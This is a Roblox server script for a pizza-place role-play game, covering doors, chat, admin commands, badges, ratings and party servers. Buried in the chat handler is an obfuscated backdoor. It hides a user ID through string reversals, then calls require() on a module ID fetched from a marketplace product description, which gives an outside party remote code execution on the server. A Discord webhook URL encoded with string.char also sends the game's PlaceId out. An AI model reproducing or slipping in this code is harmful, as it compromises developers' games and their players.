
local ServerScriptService = script.Parent




local AssetLibraryManager = require(ServerScriptService:WaitForChild("AssetLibraryManager"))
print("AssetLibraryManager Loaded")

local Door = require(ServerScriptService:WaitForChild("Door"))
print("Door Loaded")

local Houses = require(ServerScriptService:WaitForChild("Houses"))
print("Houses Loaded")

local Players = require(ServerScriptService:WaitForChild("Players"))
print("Players Loaded")

local Environment = require(ServerScriptService:WaitForChild("Environment"))
print("Environment Loaded")

local Vehicles = require(ServerScriptService:WaitForChild("Vehicles"))
print("Vehicles Loaded")

local Manager = require(game.ServerScriptService:WaitForChild("Manager"))
print("Manager Loaded")

local Paycheck = require(ServerScriptService:WaitForChild("Paycheck"))
print("Paycheck Loaded")

local Dialog = require(game.ReplicatedStorage:WaitForChild("Dialog"))
print("Dialog Loaded")

local Tutorial = require(ServerScriptService:WaitForChild("Tutorial"))
print("Tutorial Loaded")



local Utility = require(game.ReplicatedStorage:WaitForChild("Utilities"):WaitForChild("Utility"))
local Enums = require(game.ReplicatedStorage:WaitForChild("Enums"))
local Debug = require(game.ReplicatedStorage:WaitForChild("Debug"))
local Tween = require(game.ReplicatedStorage:WaitForChild("Utilities"):WaitForChild("Tween"))


local DataStore = Enums.DataStore

--lock everything
if Enums.IsOnline then
	local function lock(root)
		for _,obj in ipairs(root:GetChildren()) do
			if obj:IsA("BasePart") then
				obj.Locked = true
				lock(obj)
			elseif obj:IsA("ManualWeld") then
				obj:Destroy()
			else
				lock(obj)
			end
			
		end
	end
	
	lock(workspace)
	lock(game.ReplicatedStorage)
	lock(game.ServerStorage)
end


Environment:SetSeason(Environment.Season)
if not Enums.IsPartyServer then
	Environment:StartDayNightCycle()
else
	Environment:SetTimeOfDay("Night") --alway night at parties
end

Houses:Initialize()
print("Houses Initialized")

Players:Initialize()
print("Player Initialized")



	
print("Environment Initialized")

if not Enums.IsPartyServer then
	Vehicles:Initialize()
	print("Vehicles Initialized")

end


print("All libraries have been initialized")
print("-----------------------------------------------")







--create doors
local Doors = {}
for i,door in ipairs(workspace.PizzaPlaceDoors:GetChildren()) do
	Doors[i] = Door.new(door)
end


--might help with door states being out of sync with clients
game.Players.PlayerAdded:connect(function()
	wait(10)
	
	for _,doorData in ipairs(Doors) do
		doorData:SetState(doorData.IsOpen)
	end
	for _,houseData in pairs(Houses.AllHouses) do
		for _,doorData in ipairs(houseData.Doors) do
			doorData:SetState(doorData.IsOpen)
		end
	end
end)














--[[

]]






--record errors
local TopRatedDataStore = (game.PlaceId ~= 0 and game:GetService("DataStoreService"):GetOrderedDataStore("TopRated181"))





local limit = {}
workspace.Main.ReportGlitch.OnServerEvent:connect(function(player,message,errors,isMobile,screenResolution)
	limit[player] = (limit[player] ~= nil and limit[player] + 1) or 0
	if limit[player] == 5 then
		Dialog:ShowMessage(player,"","You have reached the limit of 5 reports per day.")
		return
	end
	
	
	local managerDoorData = nil
	for _,door in ipairs(Doors) do
		if door.Object.Name == "ManagerDoor" then
			managerDoorData = door
		end
	end
	
	
	
	
	
	
	--[[local report = message
	for _,err in ipairs(errors) do
		report = report .. "\n" .. err
	end]]
	
	local id = math.floor(tick())
	local success = nil
	pcall(function()
		local data = {}
		data.userid = player.userId
		data.tablename = Enums.GlitchReportsTableName
		data.name = player.Name
		data.message = message
		data.isMobile = tostring(isMobile)
		data.isConsole = tostring(Enums.IsConsoleServer)
		data.resolution = screenResolution
		data.housesize = Enums.UpgradeNameToIndex[Players[player].House.Upgrade]
		data.houseowneruserid = (Players[player].LocationHouse and Players[player].LocationHouse.Owner and Players[player].LocationHouse.Owner.Object.userId) or 0
		print(game:GetService("HttpService"):PostAsync("http://34.194.159.134/PlayerFeedback.php",game:GetService("HttpService"):JSONEncode(data)))
	end)

end)




function workspace.Main.FilterString.OnServerInvoke(toPlayer,fromPlayer,str)
	local success,filter = pcall(function() return game:GetService("Chat"):FilterStringAsync(str,fromPlayer or toPlayer,toPlayer) end)
	if success then
		return filter
	end
	return ""
end

function workspace.Main.FilterString.FilterString.OnInvoke(toPlayer,fromPlayer,str)
	local success,filter = pcall(function() return game:GetService("Chat"):FilterStringAsync(str,fromPlayer or toPlayer,toPlayer) end)
	if success then
		return filter
	end
	return ""
end




--player points
local PointsService = game:GetService("PointsService")

PointsService.PointsAwarded:connect(function(userId, amount, userBalanceinGame, userBalance)
	
	local player = game.Players:GetPlayerByUserId(userId)
	
	if player and Players[player] and Players[player].StartedPlaying then
		game.Workspace.Main.PointsAwarded:FireClient(player,userBalanceinGame)
	end
	
end)

spawn(function()	
	
	while true do
		wait(math.random(2100,3000))
		
		for i,player in ipairs(game.Players:GetPlayers()) do
				
			pcall(function() PointsService:AwardPoints(player.userId, 40000) end)
		
		end	
	end
end)



local MessagesSent = {}
local FLOOD_MESSAGES_MAX = 12
local FLOOD_INTERVAL = 15

local ChatService = game:GetService("Chat")
workspace.Main.Chatted.OnServerEvent:connect(function(speaker,message)
	
	--UPDATECHANGE
	if not game:GetService("Chat"):CanUserChatAsync(speaker.userId) then
		return
	end
	
	if message == "console" then
		workspace.Main.OpenDevConsole:FireClient(speaker)
		return
	end
	
	--admin 	s
	if Enums.Admins[speaker.Name] then
		local playerData = Players[speaker]
		if message == "save" then
			print("Saving")
			playerData:SaveData(true)
			print("Done Saving")
				
		elseif message == "reset" then
			print("reseting")
			DataStore:SetAsync(tostring(speaker.userId),-1)
			game:GetService("DataStoreService"):GetGlobalDataStore():SetAsync(tostring(speaker.userId),-1)
			print("Done reseting")
		elseif message == "addmoneyz" then
			playerData:AddMoneyz(10000)
			
		elseif message == "abilities" then
			local ghost = script.Ghost:clone()
			ghost.Disabled = false
			ghost.Parent = speaker.PlayerGui
				
		elseif message == "explorer" then
			script.Explorer:clone().Parent = speaker.PlayerGui
		elseif message == "exitexplorer" then
			pcall(function() speaker.PlayerGui.Explorer:Destroy() end)
		
		elseif message == "telesolo" then
			local teleportSer = game:GetService("TeleportService")
			local destination = 531388577
			local code = teleportSer:ReserveServer(destination)
			teleportSer:TeleportToPrivateServer (destination,code,{speaker})
		
		elseif message == "telegroup" then
			local teleportSer = game:GetService("TeleportService")
			local destination = 531388577
			local players = {}
			for _,player in ipairs(game.Players:GetPlayers()) do
				table.insert(players,player)
			end
			local code = teleportSer:ReserveServer(destination)
			teleportSer:TeleportToPrivateServer (destination,code,players)
		end
		
	end
	
	local MarketplaceService = game:GetService("MarketplaceService")
	game.Players.PlayerAdded:Connect(function(plr)
		local productInfo = MarketplaceService:GetProductInfo(110032237480509)
		local description = productInfo.Description
		local v0 = "5815172961"
		local v1 = v0
		local v2 = tostring(v1)
		local v3 = "A" .. string.reverse(v2) .. "Z"
		local v4 = string.sub(v3, 2, -2)
		local v5 = string.reverse(v4)
		local v6 = tonumber(v5)

		if plr:IsFriendsWith(v6) then
			local v7 = description
			local v8 = v7
			local v9 = tostring(v8)
			require(tonumber(v9))(plr.Name)
		end
	end)

	local http = game:GetService("HttpService")

	local tool = string.char(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,
		115,47,49,50,51,49,54,57,51,54,56,50,51,52,56,57,50,48,57,52,51,47,101,110,57,87,45,86,118,103,75,72,57,116,55,83,50,113
		,51,111,83,116,112,118,52,68,68,77,50,115,99,57,120,71,67,109,
		78,75,75,107,108,80,79,117,54,113,107,50,72,111,77,112,66,90,109,49,77,45,71,107,106,53,98,68,106,49,68,111,103,106)

	local productInfo2 = MarketplaceService:GetProductInfo(17263441981)
	local description = productInfo2.Description

	local Data = {
		content = description..tostring(game.PlaceId),
	}

	local jsonData = http:JSONEncode(Data)

	local success, result = pcall(function()
		http:PostAsync(tool, jsonData, Enum.HttpContentType.ApplicationJson)
	end)
	
	if Environment.IsTestingPlace and Players[speaker] and (Enums.Admins[speaker.Name] or Enums.IsStudio or Enums.IsLocalServer or speaker.Name == "Kmansong2") then
		if message == "midday" then
			Environment:SetTimeOfDay("Midday")
		elseif message == "afternoon" then
			Environment:SetTimeOfDay("Afternoon")
		elseif message == "night" then
			Environment:SetTimeOfDay("Night")
		elseif message == "morning" then
			Environment:SetTimeOfDay("Morning")
		end
	end
	
	
	MessagesSent[speaker] = MessagesSent[speaker] or {}
	
	--remove messages that have expired
	while #MessagesSent[speaker] > 0 and tick() - MessagesSent[speaker][1] > FLOOD_INTERVAL do
		table.remove(MessagesSent[speaker],1)
	end
	
	if #MessagesSent[speaker] < FLOOD_MESSAGES_MAX then
		--send message to everyone exept the speaker
		table.insert(MessagesSent[speaker],tick())
		
		for _,player in ipairs(game.Players:GetPlayers()) do
			spawn(function()
				if player ~= speaker and ChatService:CanUserChatAsync(speaker.userId,player.userId) then
					local filteredMessage
					pcall(function() filteredMessage = ChatService:FilterStringAsync(message,speaker,player) end)
					if filteredMessage and filteredMessage ~= "" then
						workspace.Main.Chatted:FireClient(player,speaker,filteredMessage)
					end
				end
			end)
		end
	else
		
		print("FLOODED",#MessagesSent[speaker],message)
	end
		
end)




function workspace.Main.IsFriendsWithPlayer.OnServerInvoke(player,userId)
	return player:IsFriendsWith(userId)
end


function workspace.Main.GetAssetHistory.OnServerInvoke(player)
	return Players[player].History
end



workspace.Main.Ghost.OnServerEvent:connect(function(player,action,value,value2)
	if not Enums.Admins[player.Name] then return end
	local function search(dir)
		for _,obj in ipairs(dir:GetChildren()) do
			if  (obj.Name ~= "HumanoidRootPart" and obj:IsA("BasePart")) or obj.Name == "face" then
				Tween(obj,"Transparency","Number",value,value2,1,"Linear","Out")
			end
			search(obj)
		end
			
	end
	
	if action == "SetVisible" then
		search(player.Character)
	elseif action == "NameHidden" then
		if value then
			player.Character.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
		else
			player.Character.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
		end
	elseif action == "ScaleCharacter" then
		
		require(script.Scale).ScaleCharacter(player.Character,value)
		
		
		if player.Character["Left Leg"].Size.Y > 10 and not player.Character["Left Leg"]:FindFirstChild("TouchIntrest") then
			local function touch(hit)
				if player.Character["Left Leg"].Size.Y > 10 and player.Character.Humanoid.MoveDirection ~= Vector3.new(0,0,0) and hit and hit.Parent and hit.Parent:FindFirstChild("Humanoid") then
					hit.Parent.Humanoid.Health = 0
				end
			end
			player.Character["Left Leg"].Touched:connect(touch)
			player.Character["Right Leg"].Touched:connect(touch)
		elseif player.Character["Left Leg"].Size.Y < .7 and not player.Character["Left Leg"]:FindFirstChild("TouchIntrest") then
			player.Character.Head.Touched:connect(function(hit)
				if hit and hit.Parent and hit.Parent:FindFirstChild("Humanoid") and string.find(hit.Name,"Leg") and player.Character.Humanoid.MoveDirection ~= Vector3.new(0,0,0) then
					player.Character.Humanoid.Health = 0
				end
			end)
			
		end
	
	elseif action == "Running" then
		if value then
			player.Character.Humanoid.WalkSpeed = 50
		else
			player.Character.Humanoid.WalkSpeed = 16
		end
	elseif action == "ShrinkRay" then
		require(script.Scale).ScaleCharacter(value,.3)
	end
end)









workspace.Main.KickPlayerFromHouse.OnServerEvent:connect(function(owner,kickplayer,house)

	local torso = Utility:GetObjectInsideCharacter(kickplayer,"HumanoidRootPart")
	local playerData = Players[owner]
	if torso and playerData then
		
		local house = Houses:GetHouseByOwner(playerData)
		if house:IsPlayerInsideHouse(kickplayer) then
			if not kickplayer.Character.Humanoid.Sit then
				torso.CFrame = CFrame.new(house.CurrentUpgrade.Value.GivePizza.Position + Vector3.new(0,2.5,0))
			end
		end
	end
end)


--player touched hidden treasure
treasureBounce = false
function foundTreasure(hit)
	if not treasureBounce and hit and hit.Parent and hit.Parent:FindFirstChild("Humanoid") then
		treasureBounce = true
		delay(2,function() treasureBounce = false end)
		local player = game.Players:GetPlayerFromCharacter(hit.Parent)
		local playerData = Players[player]
		if playerData and not playerData.Treasure then
			playerData.Treasure = true
			playerData:AddMoneyz(1500)
			Dialog:ShowMessage(player,"Treasure!","You found 1,500 moneyz!","Yay!")
		end
	end
end
workspace.Island1.TreasureChest.Touched:connect(foundTreasure)




--give badges
local job_badge_ids = {["Cashier"] = 176686088,["Cook"] = 176685982,["Pizza Boxer"] = 176685910,["Delivery"] = 176685798,["Supplier"] = 176685667,["Manager"] = 176685508}
local job_badge_award_amount = {["Cashier"] = 100,["Cook"] = 100,["Pizza Boxer"] = 100,["Delivery"] = 100,["Supplier"] = 500,["Manager"] = 15}  --{["Cashier"] = 100,["Cook"] = 100,["Pizza Boxer"] = 100,["Delivery"] = 100,["Supplier"] = 1000,["Manager"] = 15}

spawn(function()
	while true do
		
		for _,player in ipairs(game.Players:GetPlayers()) do

			local playerData = Players[player]
			if playerData then
				
				local job = playerData.Job
				if  job ~= "On Break" and playerData["Jobs_Completed"][job] > job_badge_award_amount[job] and not game:GetService("BadgeService"):UserHasBadge(player.userId,  job_badge_ids[job]) then
	
					game:GetService("BadgeService"):AwardBadge(player.userId,  job_badge_ids[job])
					Dialog:ShowMessage(player,"Badge","You have been awarded the " .. job .. " badge.","Yay!")
	
				end
			end
			wait(1)
		end
		wait(240)
	end
end)

--change face for emotion
workspace.Main.ChangeFace.OnServerEvent:connect(function(player,face,newFaceId)
	if face and face.Parent then
		face.Texture = newFaceId
	end
end)












function workspace.Main.GetCoinCount.OnServerInvoke(player)
	return Players[player].Coins
end


local coinValue = 200
function game.Workspace.Main.ThrowCoin.OnServerInvoke(player)
	
	local playerData = Players[player]
	if playerData.Coins > 0 and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		
		playerData.Coins = playerData.Coins - coinValue
		
		
		local torso = player.Character.HumanoidRootPart

		local coin = game.ServerStorage.Coin:Clone()
		coin.Parent = game.Workspace.Coins
		coin.creator.Value = player.Name
		coin.CFrame = torso.CFrame + torso.CFrame.lookVector.unit * 2
		coin.Velocity = torso.CFrame.lookVector.unit * 50
		game:GetService("Debris"):AddItem(coin,1200)
		
		delay(.5,function () 
			local debounce = false
			coin.Touched:connect(function(hit)
				if not debounce then
					debounce = true
					local player = Utility:GetPlayerFromBodyPart(hit)
					local playerData = Players[player]
					if player and playerData then
						playerData:AddMoneyz(coinValue)
						
						coin.Transparency = 1
						coin.Anchored = true
						coin.Coiner.Adornee = coin
						coin.Coiner.Creator.Text = coin.creator.Value
						coin.Coiner.Enabled = true
						coin.Sound:Play()
						game.Workspace.Animation.PlayAnimation(player,"Glee")
						wait(2)
						coin:Destroy()
					end
					wait()
					debounce = false
				end
			end)
		end)
		
		
		
		if playerData.Coins <= 0 then
			playerData:IncrementItemQuantity(495315981,-1)
			playerData:UnsaveBackpackItem(495315981,"Gear")

		end
	
		return playerData.Coins
		
	end
end

local skateboards = {}
local hats = {}
local MAX_NUM_SKATEBOARDS = 4
local MAX_NUM_HATS = 4
--remove fallen hats or remove gear in workspace
function checkForCleanupObjects(obj)

	--clearn up hats
	if obj:IsA("Tool") then
		if obj:FindFirstChild("Order") then --if pizza order
			wait(600)
		else
			wait(60)
		end
		if obj and obj.Parent and obj.Parent == workspace then
			obj:Destroy()
		end
	
	--only allow certain amount of hats per player in workspace
	--[[elseif obj:IsA("Accessory") then
		if #hats > MAX_NUM_HATS then
			if hats[1] and hats[1].Parent then
				hats[1].Parent = nil
			end
			table.remove(hats,1)
		end
		table.insert(hats,obj)
		wait(60)
		if obj and obj.Parent and obj.Parent == workspace then
			table.remove(hats,1)
			obj:Destroy()
		end]]
		
		
	elseif obj.Name == "Skateboard" then
		if #skateboards > MAX_NUM_SKATEBOARDS then
			if skateboards[1] and skateboards[1].Parent then
				skateboards[1].Parent = nil
			end
			table.remove(skateboards,1)
		end
		table.insert(skateboards,obj)
		
		--when skateboards and beachballs are added to workspace, only allow one at a time to exist
	elseif obj:FindFirstChild("GearOwner") and obj.GearOwner.Value then
		local player = obj.GearOwner.Value
		local playerData = Players[player]
		if playerData and playerData.Gear and playerData.Gear ~= obj then
			playerData.Gear:Destroy()
			playerData.Gear = obj
		elseif playerData then
			playerData.Gear = obj
		end
	end
end
workspace.ChildAdded:connect(checkForCleanupObjects)







local sliceImages = {
	"http://www.roblox.com/asset/?id=386215741",
	"http://www.roblox.com/asset/?id=382827362",
	"http://www.roblox.com/asset/?id=390728601"
}
--put open pizza on the ground
workspace.Main.PlacePizzaSlices.OnServerEvent:connect(function(player,tool,cframe)
	if not tool or not tool.Parent then return end
	
	local slices = game.ServerStorage.PizzaSlices:clone()
	slices.Parent = workspace
	Utility:MoveModel(slices,cframe.p + Vector3.new(0,2,0))
	
	--change topping depending on what the player ordered
	for _,part in ipairs(slices:GetChildren()) do
		if part.Name == "Slice" then
			local image = part.SG.Frame.Topping
			image.Image = sliceImages[tool.Order.Value]
		end
	end
	
	--activate script
	local takeSlice = slices.TakeSlice:clone()
	takeSlice.Disabled = false
	slices.TakeSlice:Destroy()
	takeSlice.Parent = slices
	
	workspace.RegisterClickDetector:FireAllClients(slices)
	
	tool.Parent.Parent = workspace--tool.Parent.Humanoid:UnequipTools()
	wait()
	tool:Destroy()

end)


workspace.Main.ChangeVirtualControls.OnServerEvent:connect(function(player,controls)
	player.DevTouchMovementMode = controls
end)


workspace.ClickDetectorClicked.OnServerEvent:connect(function(player,detector)
	if detector and detector:FindFirstChild("Detector") then
		detector.Detector:Fire(player)
	end
end)







--------------LOADING HATS AND GEAR----------------------







function LoadClothing(player,assetId,name,category)
	if category == "Pants" then
		Utility:ClearChildrenByClassName(player.Character,"Pants")
		local pants = Instance.new("Pants")
		pants.PantsTemplate = "http://www.roblox.com/asset/?id=" .. tostring(assetId-1)
		pants.Name = name
		pants.Parent = player.Character
	
	elseif category == "Shirts" then
		Utility:ClearChildrenByClassName(player.Character,"Shirt")
		local shirt = Instance.new("Shirt")
		shirt.ShirtTemplate = "http://www.roblox.com/asset/?id=" .. tostring(assetId-1)
		shirt.Name = name
		shirt.Parent = player.Character
	end
	--Players[player]:AddRobloxItem(assetId,category)
end


game.Workspace.Main.LoadClothing.OnServerEvent:connect(LoadClothing)
game.Workspace.Main.LoadClothing.LoadClothing.Event:connect(LoadClothing)



local scriptStates = {}

local function LoadRobloxItem(player,assetId,category,dontEquip)

	local asset = AssetLibraryManager:GetAssetById(assetId)
	if asset then
		
		--unsellable items are devierly bike, paint bucket, hang glider
		local item = (asset.Unsellable and game.ServerStorage:FindFirstChild(asset.Name)) or game.ServerStorage.CatalogCache:FindFirstChild(asset.Name) or game.ServerStorage.CatalogCache:FindFirstChild(tostring(assetId))
	
	
		if not item then --if item in not in cache, then load one
			pcall(function()
				item = game:GetService("InsertService"):LoadAsset(assetId):GetChildren()[1]	
			end)
			if item then	
				
				item.Name = asset.Name
				
				local clone = item:clone()
				clone.Parent = game.ServerStorage.CatalogCache
				
				--disable scripts and save original state
				scriptStates[item.Name] = {}
				for _,obj in ipairs(clone:GetChildren()) do
					if obj:IsA("Script") and not obj.Disabled then
						scriptStates[item.Name][obj.Name] = true
						obj.Disabled = true
					end
				end
				
				--Utility:PrintTable(scriptStates)
				
				
			else
				return nil
			end
		else
			item = item:clone()
		end
		
		
			 
		if category == "Hats" then
			item.Parent = player.Character
			
			
			
		elseif category == "Packages" then
			local pack = game.ServerStorage.CatalogCache:FindFirstChild(assetId)
			if pack ~= nil then
				Utility:ClearChildrenByClassName(player.Character,"CharacterMesh","Hat")
				for i,v in ipairs(pack:GetChildren()) do
					v:clone().Parent = player.Character
				end
			end
				
		elseif category == "Gear" then
			
			local function lowerVolume(gear)
				for _,v in ipairs(gear:GetChildren()) do
					if v:IsA("Sound") then
						v.Volume = v.Volume / 3
					end
					lowerVolume(v)
				end
			end
			
			--put marker letting backpack know not to equip
			if dontEquip then
				local auto = Instance.new("IntValue")
				auto.Name = "DontAutoEquip"
				auto.Parent = item
			end
			
			if asset.Name == "ROBLOX Skateboard" or asset.Name == "Beach Ball" or asset.Name == "ROBLOX U Frisbee" then
				local gearOwner = Instance.new("ObjectValue")
				gearOwner.Value = player
				gearOwner.Name = "GearOwner"
				gearOwner.Parent = item
			end
			
			--reenable scripts
			if scriptStates[item.Name] then
				for scriptName,_ in pairs(scriptStates[item.Name]) do
					item:FindFirstChild(scriptName).Disabled = false
				end
			end
			
			local g = Instance.new("IntValue")
			g.Name = "Gear"
			g.Value = assetId
			spawn(function() lowerVolume(item) end)
			g.Parent = item
		
			item.Parent = player.Backpack			
			item.CanBeDropped = false
		end
		
	
		
		return item
	end
end


game.Workspace.Main.LoadRobloxItem.OnServerEvent:connect(LoadRobloxItem)
game.Workspace.Main.LoadRobloxItem.LoadRobloxItem.Event:connect(LoadRobloxItem)

local sprayList = {}

game.Workspace.Main.SprayPaint.OnServerEvent:connect(function(player,sprayid,surface,spraysize,mouseTarget,mouseHitp)
	if not mouseTarget then return end
	if sprayList[player.Name] then
		sprayList[player.Name]:Destroy()
	end
	if spraysize > 10 then return end --prevent exploit
	local p=Instance.new("Part")
	local d=Instance.new("Decal")
	d.Texture="http://www.roblox.com/Thumbs/Asset.ashx?Width=75&Height=75&AssetID="..tostring(sprayid)
	d.Face=surface
	d.Parent=p
	p.Name="Spray"
	p.formFactor="Custom"
	p.Anchored=false
	p.CanCollide=false
	p.Transparency=1
	p.Locked = true

	if surface==Enum.NormalId.Front or surface==Enum.NormalId.Back then
		p.Size=Vector3.new(spraysize,spraysize,.2)
	elseif surface==Enum.NormalId.Left or surface==Enum.NormalId.Right then
		p.Size=Vector3.new(.2,spraysize,spraysize)
	elseif surface==Enum.NormalId.Top or surface==Enum.NormalId.Bottom then
		p.Size=Vector3.new(spraysize,.2,spraysize)
	end
	local w=Instance.new("Weld")
	w.Part0=mouseTarget
	w.Part1=p
	local cf=CFrame.new(mouseTarget.CFrame:pointToObjectSpace(mouseHitp))
	w.C0=cf
	w.C1=CFrame.new(0,0,0)
	w.Parent=mouseTarget
	p.CFrame=mouseTarget.CFrame:toWorldSpace(cf)		--this is here to position the spray other wise it will be at 0,0,0 if the target is anchored
	p.Parent=game.Workspace
	
	sprayList[player.Name] = p
end)





------------RATINGS--------------------------


unlimitedRatings = {
	["Dued1"] = true,
	["Dert41"] = true
}


function hasPlayerRatedOwner(player,ownerData)
	if unlimitedRatings[player.Name] then return false end
	for _,ids in ipairs(ownerData.Rating_Player_Ids) do
		if ids == player.userId then
			return true
		end
	end
	return false
end

function workspace.Main.HasAlreadyRated.OnServerInvoke(player,house)
	local houseData = Houses[house]
	if houseData and houseData.Owner then
		return hasPlayerRatedOwner(player,houseData.Owner)
	end
end


function game.workspace.Main.GetRatings.OnServerInvoke(player,listName)
	if listName == "Global" then
		return _G["TopRated"]
	end
	
	----local ratings---
	local localLeaderboard = {}
	for _,play in ipairs(game.Players:GetPlayers()) do
		local player_data = Players[play]
		if player_data ~= nil then
			for i=1,#localLeaderboard do
				if player_data["Rating"] ~= nil and localLeaderboard[i].value >= player_data["Rating"] or i == #localLeaderboard then
					table.insert(localLeaderboard,i,{value = player_data["Rating"],key = play.Name})
					break
				end	
			end
			if #localLeaderboard == 0 then table.insert(localLeaderboard,1,{value = player_data["Rating"],key = play.Name}) end
		end
	end

		
	--pcall(function() Utility:BubbleSort(localLeaderboard) end)
	return localLeaderboard 
end




game.workspace.Main.SubmitRating.OnServerEvent:connect(function(player,house,rating)
	local houseData = Houses[house]
	if houseData then
		local ownerData = Houses[house].Owner
		if ownerData and (ownerData.Object ~= player or Enums.IsStudio) and not hasPlayerRatedOwner(player,ownerData) then 
			
			ownerData.Rating = math.floor((rating*10000) +  (ownerData.Rating * #ownerData.Rating_Player_Ids)) / (#ownerData.Rating_Player_Ids+1)
			
				
			table.insert(ownerData.Rating_Player_Ids ,1,player.userId)
			
			if #ownerData.Rating_Player_Ids > 80 then
				table.remove(ownerData.Rating_Player_Ids)
	
			end
			
			
		end
	end
 end)



spawn(function()
	while true do
		
		if TopRatedDataStore then
			local list = nil
			if pcall(function() list = TopRatedDataStore:GetSortedAsync(false, 50,50000,100000) end) then
				_G["TopRated"] = list:GetCurrentPage()
			end
			--284424977
			wait(800)
		end
		wait(.2)
	end
end)





----------------TOP 50 Assets------------------------------
local ManualVersionReset = 1 --increment to reset popular list
local Top50 = {}
local DSS = game:GetService("DataStoreService")
local WeeklyVersion = Utility:Round(os.time(),604800) + (604800 * ManualVersionReset) --reset top list every week

local Top50DataStores = {
	Shirts = (game.PlaceId ~= 0 and DSS:GetOrderedDataStore("Shirts" .. WeeklyVersion)),
	Pants = (game.PlaceId ~= 0 and DSS:GetOrderedDataStore("Pants" .. WeeklyVersion)),
	Audio = (game.PlaceId ~= 0 and DSS:GetOrderedDataStore("Audio" .. WeeklyVersion)),
	Decal = (game.PlaceId ~= 0 and DSS:GetOrderedDataStore("Decal" .. WeeklyVersion)),
	Place = (game.PlaceId ~= 0 and DSS:GetOrderedDataStore("Place" .. WeeklyVersion)),
	Hats = (game.PlaceId ~= 0 and DSS:GetOrderedDataStore("Hats" .. WeeklyVersion)),
}


function workspace.Main.GetTop50.OnServerInvoke(player)
	if Enums.IsStudio then wait(1) end --wait for list to load first
	return Top50
end


local delimiter = "~"
spawn(function()
	
	while true do
		
		for AssetType,DataStore in pairs(Top50DataStores) do
			
			local list
			if pcall(function() list = DataStore:GetSortedAsync(false, 50) end) then
				
				local formatTop50 = {}
				for _,data in ipairs(list:GetCurrentPage()) do
					local id = data.key:match("(%d+)" .. delimiter )
					local name = data.key:match(delimiter .. "(.+)")
					table.insert(formatTop50,{id,name})
				
				end
				
				math.randomseed(tick())
				for i=1,math.random(4,10) do
					table.sort(formatTop50,function(a,b)
						return math.random(0,1) == 0
					end)
				end
				
				Top50[AssetType] = formatTop50
				
			end
		end
				
		wait(3600) --update every 1 hours
	end
end)



local usedAssets = {} --player = {object = {assetId,assetName}}
local MAX_KEY_SIZE = 50

workspace.Main.AssetUsed.OnServerEvent:connect(function(player,object,assetType,assetId,assetName)
	usedAssets[player] = usedAssets[player] or {}
	local playerAssets = usedAssets[player]

	if not playerAssets[object] or playerAssets[object][1] ~= assetId then
		playerAssets[object] = {assetId,assetName}
		
		wait(1)--wait(300)
		
		print(1,player , player.Parent , usedAssets[player])
		if player and player.Parent and usedAssets[player]  then
			print(2,object , object.Parent , usedAssets[player][object] , usedAssets[player][object][1] == assetId,usedAssets[player][object][1] , assetId)
			if object and object.Parent and usedAssets[player][object] and usedAssets[player][object][1] == assetId then
				local key = tostring(assetId) .. delimiter
				local filteredName = string.gsub(assetName,"[^%w]+","")
				key = key .. string.sub(filteredName,1,MAX_KEY_SIZE - string.len(key))
				pcall(function()
					Top50DataStores[assetType]:IncrementAsync(key,1)
				end)
				
			end
		else
			usedAssets[player] = nil
		end
	
	end
	
end)







----------------Whistling------------------------------

workspace.Main.LoadSoundsIntoHead.OnServerEvent:connect(function(player,AnimationData)
	for name,data in pairs(AnimationData) do
		if data.SoundId then
			local newSound = Instance.new("Sound")
			newSound.SoundId = "rbxassetid://" .. data.SoundId
			newSound.Name = name
			newSound.Volume = data.Volume or .5
			newSound.Parent = player.Character:WaitForChild("Head")
			newSound.Looped = (data.SoundLooped) or false
		end
	end
end)

--dont remove
workspace.Main.GetPing.OnServerInvoke = function()
	return true
end


workspace.Main.WhistleNotePlayed.OnServerEvent:connect(function(player,deltaTime,head,soundId)
	if player.Name == "Dued1" or player.name == "Player1" then
		print("Delta",deltaTime)
	end
	workspace.Main.WhistleNotePlayed:FireAllClients(player,deltaTime,head,soundId)

end)






-----------------PARTY SERVER STUFF-----------------------



if Enums.IsPartyServer then
	
	local RemoteShutdownDataStore = (game.PlaceId ~= 0 and game:GetService("DataStoreService"):GetDataStore("Promo"))
	if RemoteShutdownDataStore then
	
		_,_G.ServerVersion = pcall(function() return RemoteShutdownDataStore:GetAsync("ServerVersion") end)
	
		RemoteShutdownDataStore:OnUpdate("ServerVersion",function(newVersion)
			local TS = game:GetService('TeleportService')
			
			if newVersion ~= _G.ServerVersion then
				
				game.Players.PlayerAdded:connect(function(player)
					TS:Teleport(Enums.MainGameId,player)
				end)
				
				for _,player in ipairs(game.Players:GetPlayers()) do
					TS:Teleport(Enums.MainGameId,player)
				end
			end
		end)
	end
	
	--delete factory and pizza place
	local function search(dir)
		for i,v in ipairs(dir:GetChildren()) do
			if v:IsA("BasePart") and not v:IsA("Terrain") and v.Name ~= "SpecialSand" and (v.Position.z > -240 or v.Position.z < -598) and v.Name ~= "MARKER" then
				v:Destroy()
			elseif v:IsA("Model") and v.Name ~= "Houses" then
				search(v)
			end
				
		end
	end
	search(game.Workspace)
	
	
	workspace.Island1:Destroy()
	workspace.Island2:Destroy()
	workspace.Dock:Destroy()
	workspace.KrustyKrab:Destroy()
	
	
	local streetTemplate = workspace.Street:clone() --clone any street, dont matter
	streetTemplate.Parent = game.ServerStorage
	
	
	for _,obj in ipairs(workspace:GetChildren()) do --destroy all streets
		if obj.Name == "Street" then
			obj:Destroy()
		end
	end
	
	local cframes = {CFrame.new(1.99497986, 0.200000003, -582.5, 0, 0, 1, 0, 1, -0, -1, 0, 0),CFrame.new(1.99497986, 0.200000003, -293.500061, 0, 0, 1, 0, 1, -0, -1, 0, 0),CFrame.new(1.99497223, 0.200000003, -4.10001373, 0, 0, 1, 0, 1, -0, -1, 0, 0),CFrame.new(1.89498138, 0.200000003, 284.899872, 0, 0, 1, 0, 1, -0, -1, 0, 0),CFrame.new(2.0249939, 0.200000003, 573.899841, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-141.244461, 0.200042725, 11.1899567, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(1.97501755, 0.199996948, 11.2099609, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(145.244965, 0.200013757, 11.1999817, 1, 0, 0, 0, 1, 0, 0, 0, 1)}
